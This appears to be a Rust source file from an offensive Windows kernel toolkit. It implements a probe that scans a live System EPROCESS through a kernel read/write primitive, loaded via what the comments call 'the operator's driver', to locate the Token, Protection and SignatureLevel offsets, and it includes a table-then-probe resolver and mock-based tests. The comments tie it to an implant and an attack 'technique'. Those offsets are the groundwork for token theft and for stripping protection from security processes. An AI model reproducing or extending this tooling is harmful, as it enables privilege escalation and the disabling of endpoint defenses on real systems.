            // SignatureLevel and SectionSignatureLevel are adjacent, Protection = SectionSigLevel + 1
            assert_eq!(
                b.offsets.section_signature_level,
                b.offsets.signature_level + 1
            );
            assert_eq!(b.offsets.protection, b.offsets.section_signature_level + 1);
        }
    }

    #[test]
    fn covers_all_major_releases() {
        let builds = known_builds();
        for &expected in &[10240, 14393, 17763, 19041, 20348, 22621, 26100, 26200] {
            assert!(builds.contains(&expected), "missing build {expected}");
        }
    }
}

// ============================================================================
// DefenderDump-style dynamic EPROCESS offset probe
// ============================================================================

use crate::{KernelRw, KrwError};

/// Maximum EPROCESS size to scan (safety bound).
const EPROCESS_SCAN_LIMIT: usize = 0x1000;

/// Known-system invariant: PID + 0x78 = Token offset (verified 17763–26200).
/// This holds because Windows keeps a fixed delta between UniqueProcessId
/// and Token across ALL known Win10/11 x64 builds (DefenderDump verified).
const PID_TO_TOKEN_DELTA: usize = 0x78;

/// DefenderDump-style dynamic EPROCESS offset probe.
///
/// Given a working `KernelRw` and the System EPROCESS base KVA (PID 4),
/// discovers all field offsets by scanning the structure invariants:
///
/// 1. **PID offset**: scan for a qword == 4 (System PID)
/// 2. **Links offset**: PID + 8 (ActiveProcessLinks is the LIST_ENTRY
///    immediately after UniqueProcessId in all known builds)
/// 3. **Token offset**: PID + 0x78 (constant delta, verified 17763–26200)
/// 4. **ImageFileName offset**: scan for ASCII "System\0" after Links
/// 5. **Protection offset**: scan for byte 0x72 (WinSystem:PP) after
///    ImageFileName — System's protection level
/// 6. **SignatureLevel**: Protection - 2 (three adjacent bytes:
///    SigLevel, SectionSigLevel, Protection — verified all builds)
///
/// Returns `KrwError::UnresolvedOffset` if any step fails (unknown layout,
/// corrupted structure, or non-standard build).
pub fn probe_eprocess_offsets(
    krw: &dyn KernelRw,
    system_eprocess_kva: usize,
) -> Result<EprocessOffsets, KrwError> {
    // Safety: scan within EPROCESS bounds.
    let _scan_limit = system_eprocess_kva + EPROCESS_SCAN_LIMIT;

    // Step 1: Find PID offset — scan for qword == 4 (System PID).
    let mut pid_offset = None;
    for off in (0..0x600).step_by(8) {
        let val = krw.kread_u64(system_eprocess_kva + off)?;
        if val == 4 {
            pid_offset = Some(off);
            break;
        }
    }
    let pid_offset = pid_offset.ok_or(KrwError::UnresolvedOffset(
        "PID scan: System PID=4 not found",
    ))?;

    // Step 2: Links offset = PID + 8 (LIST_ENTRY follows UniqueProcessId).
    let links_offset = pid_offset + 8;

    // Verify Links: Flink should be a valid kernel pointer.
    let flink = krw.kread_u64(system_eprocess_kva + links_offset)?;
    if flink < 0xFFFF_8000_0000_0000 {
        return Err(KrwError::UnresolvedOffset(
            "Links scan: Flink not a kernel VA",
        ));
    }

    // Step 3: Token offset = PID + 0x78 (constant delta).
    let token_offset = pid_offset + PID_TO_TOKEN_DELTA;
    if token_offset + 8 > EPROCESS_SCAN_LIMIT {
        return Err(KrwError::UnresolvedOffset(
            "Token offset exceeds EPROCESS size",
        ));
    }

    // Step 4: Scan for ImageFileName — ASCII "System\0" after Links.
    let system_name = *b"System\0";
    let mut image_name_offset = None;
    for off in links_offset + 16..0x600 {
        let mut buf = [0u8; 8];
        krw.kread(system_eprocess_kva + off, &mut buf)?;
        if buf[..7] == system_name[..7] {
            image_name_offset = Some(off);
            break;
        }
    }
    let image_name_offset = image_name_offset.ok_or(KrwError::UnresolvedOffset(
        "ImageFileName scan: 'System' not found",
    ))?;

    // Step 5: Scan for Protection byte == 0x72 (WinSystem:PP = Type:2 | Signer:7<<4).
    // Protection is a single byte, located after ImageFileName in all known builds.
    let mut protection_offset = None;
    for off in image_name_offset + 16..0xA00 {
        // Read one byte at a time to avoid IOCTL storms and page-boundary
        // faults (kread_u64 issues 8 individual IOCTL calls per step).
        let mut byte_buf = [0u8; 1];
        krw.kread(system_eprocess_kva + off, &mut byte_buf)
            .map_err(|_| KrwError::UnresolvedOffset("Protection scan: kread failed"))?;
        if byte_buf[0] == 0x72 {
            protection_offset = Some(off);
            break;
        }
    }
    let protection_offset = protection_offset.ok_or(KrwError::UnresolvedOffset(
        "Protection scan: 0x72 (WinSystem:PP) not found",
    ))?;

    // Step 6: SigLevel = Protection - 2, SectionSigLevel = Protection - 1.
    // Verified: these three bytes are always adjacent in all known builds.
    let sig_level = protection_offset
        .checked_sub(2)
        .ok_or(KrwError::UnresolvedOffset("SigLevel: offset underflow"))?;
    let section_sig_level = protection_offset - 1;

    Ok(EprocessOffsets {
        unique_process_id: pid_offset,
        active_process_links: links_offset,
        token: token_offset,
        image_file_name: image_name_offset,
        signature_level: sig_level,
        section_signature_level: section_sig_level,
        protection: protection_offset,
        // peb: undiscoverable via System-process invariants (System's PEB is
        // NULL); unknown builds relying on the probe return 0 here and must
        // resolve the PEB offset another way or degrade.
        peb: 0,
    })
}

/// The three-layer EPROCESS offset resolution chain. This is the canonical
/// entry point for any kit that needs EPROCESS offsets — it implements the
/// "table → probe" degradation documented at the top of this module:
///
/// 1. **Table lookup (zero kernel reads)** — [`for_build`] exact match +
///    patch-equivalent allow-list. The fast path for any known build; costs
///    nothing on the target (offsets are compile-time constants).
/// 2. **DefenderDump invariant probe (a handful of kernel reads)** —
///    [`probe_eprocess_offsets`] scans the live System EPROCESS for structural
///    invariants (PID=4, "System" name, 0x72 protection byte). Works on ANY
///    Windows x64 build, including future ones not in the table. This is the
///    fallback for unknown builds.
///
/// Call this instead of `for_build` directly when you have a `KernelRw`
/// primitive (i.e. the operator's driver is loaded). The implant-side
/// `offsets_table::for_build` has no probe fallback because ring-3 cannot read
/// kernel memory — it returns `None` for unknown builds and the technique
/// degrades.
///
/// Returns the offsets on success, or a [`KrwError`] if both layers fail
/// (corrupted EPROCESS, kernel read fault, or a layout the probe's invariants
/// don't cover — which would indicate a genuinely novel EPROCESS redesign).
pub fn resolve_eprocess_offsets(
    build: u32,
    krw: &dyn KernelRw,
    system_eprocess_kva: usize,
) -> Result<EprocessOffsets, KrwError> {
    // Layer 1: table lookup (fast path — no kernel reads needed).
    if let Some(entry) = for_build(build) {
        return Ok(entry.offsets);
    }
    // Layer 2: dynamic invariant probe (works on any build, known or unknown).
    probe_eprocess_offsets(krw, system_eprocess_kva)
}

#[cfg(test)]
mod probe_tests {
    use super::*;
    use crate::KrwError;
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
        fn set_bytes(&self, addr: usize, data: &[u8]) {
            let mut m = self.0.lock();
            for (i, &b) in data.iter().enumerate() {
                m.insert(addr + i, b);
            }
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, &b) in src.iter().enumerate() {
                m.insert(kaddr + i, b);
            }
            Ok(())
        }
    }

    fn build_mock_system_eprocess(krw: &MockKrw, base: usize, offsets: &EprocessOffsets) {
        // PID = 4 (System)
        krw.set_u64(base + offsets.unique_process_id, 4);
        // ActiveProcessLinks: Flink = kernel VA, Blink = kernel VA
        krw.set_u64(base + offsets.active_process_links, 0xFFFF_8000_0000_1000);
        krw.set_u64(
            base + offsets.active_process_links + 8,
            0xFFFF_8000_0000_2000,
        );
        // Token (any value — probe doesn't validate token content)
        krw.set_u64(base + offsets.token, 0xFFFF_8000_0000_5000 | 0x7);
        // ImageFileName = "System\0"
        krw.set_bytes(base + offsets.image_file_name, b"System\0");
        // Protection = 0x72 (WinSystem:PP)
        krw.set_bytes(base + offsets.protection, &[0x72]);
        // SignatureLevel + SectionSignatureLevel (adjacent bytes before Protection)
        krw.set_bytes(base + offsets.signature_level, &[0x00]);
        krw.set_bytes(base + offsets.section_signature_level, &[0x00]);
    }

    #[test]
    fn probe_discovers_17763_offsets() {
        let krw = MockKrw::new();
        let base = 0xFFFF_8000_0010_0000usize;
        // Use the KNOWN 17763 offsets to set up the mock.
        let known = for_build(17763).unwrap().offsets;
        build_mock_system_eprocess(&krw, base, &known);
        let discovered = probe_eprocess_offsets(&krw, base).unwrap();
        let mut expected = known;
        expected.peb = 0;
        assert_eq!(discovered, expected);
    }

    #[test]
    fn probe_discovers_26100_offsets() {
        let krw = MockKrw::new();
        let base = 0xFFFF_8000_0010_0000usize;
        let known = for_build(26100).unwrap().offsets;
        build_mock_system_eprocess(&krw, base, &known);
        let discovered = probe_eprocess_offsets(&krw, base).unwrap();
        let mut expected = known;
        expected.peb = 0;
        assert_eq!(discovered, expected);
    }

    #[test]
    fn probe_discovers_19041_offsets() {
        let krw = MockKrw::new();
        let base = 0xFFFF_8000_0010_0000usize;
        let known = for_build(19041).unwrap().offsets;
        build_mock_system_eprocess(&krw, base, &known);
        let discovered = probe_eprocess_offsets(&krw, base).unwrap();
        let mut expected = known;
        expected.peb = 0;
        assert_eq!(discovered, expected);
    }

    #[test]
    fn probe_fails_on_empty_memory() {
        let krw = MockKrw::new();
        let base = 0xFFFF_8000_0010_0000usize;
        assert!(probe_eprocess_offsets(&krw, base).is_err());
    }

    /// Cross-validates the probe against every build in KNOWN_EPROCESS_BUILDS.
    #[test]
    fn probe_discovers_all_known_builds() {
        for entry in KNOWN_EPROCESS_BUILDS {
            let krw = MockKrw::new();
            let base = 0xFFFF_8000_0010_0000usize;
            build_mock_system_eprocess(&krw, base, &entry.offsets);
            let discovered = probe_eprocess_offsets(&krw, base)
                .unwrap_or_else(|e| panic!("probe failed for build {}: {:?}", entry.build, e));
            let mut expected = entry.offsets;
            expected.peb = 0;
            assert_eq!(
                discovered, expected,
                "probe returned wrong offsets for build {}",
                entry.build,
            );
        }
    }

    // ---- resolve_eprocess_offsets: the table → probe fallback chain ---------

    #[test]
    fn resolve_uses_table_for_known_build() {
        // A known build (17763) resolves from the table WITHOUT touching the
        // kernel — even with an empty MockKrw (no System EPROCESS populated),
        // the table layer returns the offsets before the probe ever runs.
        let krw = MockKrw::new();
        let base = 0xFFFF_8000_0010_0000usize;
        let resolved = resolve_eprocess_offsets(17763, &krw, base).unwrap();
        assert_eq!(resolved, for_build(17763).unwrap().offsets);
    }

    #[test]
    fn resolve_uses_table_for_patch_equivalent_build() {
        // 19045 is a patch-equivalent build (→ 19041). The table layer resolves
        // it before the probe runs (empty MockKrw is fine).
        let krw = MockKrw::new();
        let base = 0xFFFF_8000_0010_0000usize;
        let resolved = resolve_eprocess_offsets(19045, &krw, base).unwrap();
        assert_eq!(resolved, for_build(19041).unwrap().offsets);
    }

    #[test]
    fn resolve_falls_back_to_probe_for_unknown_build() {
        // A hypothetical future build (26300) is NOT in the table and NOT
        // patch-equivalent. resolve_eprocess_offsets MUST fall back to the
        // DefenderDump probe. We simulate a 26100-layout EPROCESS (the most
        // recent known layout) and verify the probe discovers it — proving
        // the fallback chain works even when the table has no entry.
        let krw = MockKrw::new();
        let base = 0xFFFF_8000_0010_0000usize;
        let known_26100 = for_build(26100).unwrap().offsets;
        build_mock_system_eprocess(&krw, base, &known_26100);
        // 26300 is unknown → for_build returns None → probe runs.
        let resolved = resolve_eprocess_offsets(26300, &krw, base)
            .unwrap_or_else(|e| panic!("resolve should probe-fallback for unknown build: {:?}", e));
        let mut expected = known_26100;
        expected.peb = 0;
        assert_eq!(resolved, expected);
    }

    #[test]
    fn resolve_fails_when_both_layers_miss() {
        // Unknown build AND empty kernel memory (probe finds nothing).
        // Both layers fail → resolve returns Err (NOT a silent wrong offset).
        let krw = MockKrw::new();
        let base = 0xFFFF_8000_0010_0000usize;
        assert!(resolve_eprocess_offsets(26300, &krw, base).is_err());
    }
}
